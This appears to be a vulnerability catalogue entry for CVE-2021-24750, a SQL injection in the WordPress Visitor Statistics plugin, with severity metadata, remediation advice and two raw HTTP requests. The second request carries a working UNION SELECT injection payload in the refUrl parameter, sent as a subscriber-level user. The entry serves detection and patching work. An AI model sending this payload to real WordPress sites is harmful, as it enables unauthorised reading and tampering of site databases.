---
layout: post
cve_id: CVE-2021-24750
title: WordPress Visitor Statistics (Real Time Traffic) <4.8 -SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24750.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24750.yaml
snort2_rule: N/A
snort3_rule: N/A
author: cckuakilong
severity: high
impact: 'Successful exploitation of this vulnerability allows an attacker to execute
  arbitrary SQL queries, potentially leading to unauthorized access, data manipulation,
  or data leakage.

  '
remediation: 'Update to the latest version of the WordPress Visitor Statistics (Real
  Time Traffic) plugin (version 4.8 or higher) to mitigate the SQL Injection vulnerability.

  '
reference:
- https://github.com/fimtow/CVE-2021-24750/blob/master/exploit.py
- https://wpscan.com/vulnerability/7528aded-b8c9-4833-89d6-9cd7df3620de
- https://plugins.trac.wordpress.org/changeset/2622268
- https://nvd.nist.gov/vuln/detail/CVE-2021-24750
- https://github.com/WhooAmii/POC_to_review
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2021-24750
  cwe-id: CWE-89
  epss-score: 0.69584
  epss-percentile: 0.98596
  cpe: cpe:2.3:a:wp_visitor_statistics_\(real_time_traffic\)_project:wp_visitor_statistics_\(real_time_traffic\):*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  vendor: wp_visitor_statistics_\(real_time_traffic\)_project
  product: wp_visitor_statistics_\(real_time_traffic\)
  framework: wordpress
tags:
- cve2021
- cve
- authenticated
- wpscan
- sqli
- wp
- wordpress
- wp-plugin
- wp_visitor_statistics_\(real_time_traffic\)_project
- vkev
- vuln
---

## ðŸ” Vulnerability Description
WordPress Visitor Statistics (Real Time Traffic) plugin before 4.8 does not properly sanitize and escape the refUrl in the refDetails AJAX action, which is available to any authenticated user. This could allow users with a role as low as subscriber to perform SQL injection attacks.

## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Origin: /
Accept-Encoding: gzip
log=fi8Cz8&pwd=ArUDCv&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5(2453),4--%20%22%7D HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Connection: close
Accept-Encoding: gzip
```

